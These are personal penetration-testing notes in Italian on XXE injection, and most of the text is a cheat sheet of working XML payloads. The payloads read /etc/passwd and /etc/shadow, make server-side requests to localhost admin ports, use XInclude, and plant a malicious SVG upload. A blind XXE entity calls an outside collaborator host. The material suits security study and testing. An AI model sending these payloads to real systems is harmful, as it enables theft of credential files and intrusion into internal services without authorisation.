#Exploit_noti 

---
---
---
#### INDICE
- [[#Introduzione]]
- [[#Recupero di file locali]]
- [[#SSRF via entità esterne]]
- [[#Blind XXE (con Burp Collaborator)]]
- [[#XInclude attack]]
- [[#File upload e content-type]]

---
---
---
### Introduzione
L’**XML External Entity Injection (XXE)** è una vulnerabilità che sfrutta la cattiva gestione dell’analisi XML da parte di un'applicazione per accedere a file, effettuare richieste HTTP lato server ([[Web Exploitations/SSRF|SSRF]]), o esfiltrare dati. Essa è causata dall'abilitazione di entità esterne nei parser XML.

> [!ATTENTION]  
> **Dove cercare:** funzionalità che usano XML nei body delle richieste (es. SOAP, SVG, DOCX).  
> **Cosa cercare:** DOCTYPE, tag `<!ENTITY>`, namespace `XInclude`, risposte contenenti errori XML.

> Documentazione sul linguaggio [XML](https://www.w3schools.com/xml/xml_whatis.asp).

---
### Recupero di file locali

```
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
<stockCheck>
	<productId>&xxe;</productId>
</stockCheck>
```

---
### SSRF via entità esterne

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:8000/"> ]>
<request>
	<url>&xxe;</url>
</request>
```

---
### Blind XXE (con Burp Collaborator)

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.burpcollaborator.net"> ]>
<data>&xxe;</data>
```

---
### XInclude attack

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
	<xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

---
### File retrieval
Viene usata una `<!ENTITY>` per iniettare un file locale nel corpo della risposta:

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
```

Utile per leggere file come `/etc/passwd` o `C:\Windows\win.ini`.

---
### SSRF via XXE
Il parser può essere forzato a fare una richiesta HTTP a un host interno:

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:8000/admin"> ]>
```

---
### Blind XXE
Quando il contenuto della risposta non è visibile:
- Usare Burp Collaborator o webhook.site
- Triggerare richieste HTTP o DNS verso un dominio controllato

---
### XInclude
Se non è possibile manipolare il DOCTYPE, ma l’XML viene costruito server-side:

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
	<xi:include parse="text" href="file:///etc/shadow"/>
</foo>
```

---
### File upload e content-type
Alcuni formati (`.svg`, `.docx`, `.odt`, `.xml`, SOAP) possono essere veicolo di XXE se:
- Accettano upload di file XML-like
- Il server effettua parsing post-upload
Esempio `.svg` malevolo:

```
<?xml version="1.0"?> 
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
<svg>
	<text>&xxe;</text>
</svg>
```

Oppure un `.docx` contenente componenti `.xml` modificati.